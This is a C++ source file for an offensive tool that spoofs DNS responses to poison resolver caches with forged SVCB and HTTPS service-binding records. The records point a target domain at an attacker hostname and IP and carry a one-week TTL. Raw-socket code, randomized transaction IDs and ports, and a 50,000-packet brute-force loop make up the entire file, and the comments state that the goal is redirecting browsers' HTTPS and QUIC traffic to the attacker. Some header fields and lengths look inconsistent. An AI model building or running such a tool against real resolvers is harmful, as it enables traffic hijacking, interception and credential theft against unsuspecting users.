// Compile: g++ -o svcb_poison svcb_poison.cpp
// Run: sudo ./svcb_poison <target_dns> <domain> <attacker_endpoint>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class SVCBPoison {
private:
    std::string targetDNS, domain, attackerEndpoint;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    SVCBPoison(const std::string& dns, const std::string& d,
               const std::string& endpoint)
        : targetDNS(dns), domain(d), attackerEndpoint(endpoint) {}
    
    // Poison SVCB (Service Binding) and HTTPS records
    // Used by modern browsers to determine alt-svc endpoints
    // Poisoning redirects all HTTPS/QUIC traffic to attacker
    void poisonSVCB(uint16_t txid, uint16_t dstPort, bool https) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);
        *(uint16_t*)(dns + 8) = htons(0);
        *(uint16_t*)(dns + 10) = htons(1);  // Glue
        
        int pos = 12;
        
        // Question: domain, type SVCB (64) or HTTPS (65)
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(https ? 65 : 64); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        // SVCB/HTTPS Answer with attacker endpoint
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(https ? 65 : 64); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        
        int svcbLenPos = pos;
        pos += 2;
        int svcbStart = pos;
        
        // SvcPriority = 0 (AliasMode) - points to attacker
        *(uint16_t*)(dns + pos) = htons(0); pos += 2;
        
        // TargetName = attacker hostname
        pos += encodeName(dns + pos, attackerEndpoint);
        
        // SvcParams: alpn="h2,h3" and ipv4hint
        // Key 1 (alpn)
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(9); pos += 2;  // Length
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;  // "h2"
        dns[pos++] = 'h'; dns[pos++] = '2';
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;  // "h3"
        dns[pos++] = 'h'; dns[pos++] = '3';
        
        // Key 4 (ipv4hint) - IP of attacker endpoint
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;  // Length
        struct in_addr addr;
        inet_aton("1.2.3.4", &addr);  // Attacker IP
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        *(uint16_t*)(dns + svcbLenPos) = htons(pos - svcbStart);
        
        // Glue A record for attacker endpoint
        pos += encodeName(dns + pos, attackerEndpoint);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] SVCB/HTTPS record poisoning\n";
        std::cout << "[*] Attacker endpoint: " << attackerEndpoint << "\n";
        
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            poisonSVCB(txid, port, i % 2 == 0);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns> <domain> <attacker_endpoint>\n";
        return 1;
    }
    srand(time(NULL));
    SVCBPoison poison(argv[1], argv[2], argv[3]);
    poison.run(50000);
    return 0;
}
